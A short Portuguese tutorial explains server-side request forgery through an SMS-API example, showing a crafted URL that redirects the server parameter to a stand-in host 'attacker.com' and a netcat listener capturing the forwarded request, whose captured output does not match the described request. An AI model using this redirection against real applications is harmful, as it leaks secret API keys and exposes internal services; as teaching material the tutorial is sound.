# Server-side Request Forgery (SSRF)

O SSRF, ou Falsificação de Requisição do Lado do Servidor, é uma vulnerabilidade em que um atacante pode forçar uma aplicação web a enviar requisições em seu nome para destinos arbitrários, mantendo controle sobre o conteúdo da requisição. Essas vulnerabilidades geralmente surgem em implementações que utilizam serviços de terceiros.

Imagine uma aplicação web que utiliza uma API externa para enviar notificações SMS para seus clientes. Para cada mensagem, o site precisa fazer uma requisição web ao servidor do provedor de SMS para enviar o conteúdo da mensagem. Como o provedor de SMS cobra por mensagem, eles exigem que você adicione uma chave secreta, que eles pré-atribuem a você, a cada requisição feita à API deles. A chave da API funciona como um token de autenticação e permite ao provedor saber a quem faturar cada mensagem. O funcionamento da aplicação seria assim:

![SSRF](/content/SSRF.png)

olhando o diagrama, é fácil ver onde está a vulnerabilidade. A aplicação expõe o parâmetro do servidor para os usuários, que define o nome do servidor do provedor de SMS. Se o atacante quisesse, eles poderiam simplesmente alterar o valor do servidor para apontar para uma máquina controlada por ele, e sua aplicação web encaminharia a requisição de SMS para o atacante em vez do provedor de SMS. Como parte da mensagem encaminhada, o atacante obteria a chave da API, permitindo que eles utilizassem o serviço de SMS para enviar mensagens às suas custas. Para isso, o atacante só precisaria fazer a seguinte requisição para o seu site:

`https://www.mysite.com/sms?server=attacker.com&msg=HACKED`

Isso faria com que o servidor sms fizesse uma requisição para:

`https://attacker.com/api/send?msg=HACKED`

Você poderia capturar o conteúdo da requisição usando o Netcat:

```
user@ubuntu$ nc -lvp 80
Listening on 0.0.0.0 80
Connection received on 10.10.1.236 43830
GET /:8087/public-docs/123.pdf HTTP/1.1
Host: 10.10.10.11
User-Agent: PycURL/7.45.1 libcurl/7.83.1 OpenSSL/1.1.1q zlib/1.2.12 brotli/1.0.9 nghttp2/1.47.0
Accept: */*
```

Este é um caso muito básico de SSRF. Se isso não parecer assustador, o SSRF pode ser usado para fazer muito mais. Em geral, dependendo dos detalhes de cada cenário, o SSRF pode ser usado para:

- Enumerar redes internas, incluindo endereços IP e portas.
- Abusar das relações de confiança entre servidores e obter acesso a serviços restritos.
- Interagir com alguns serviços não-HTTP para obter execução remota de código (RCE).




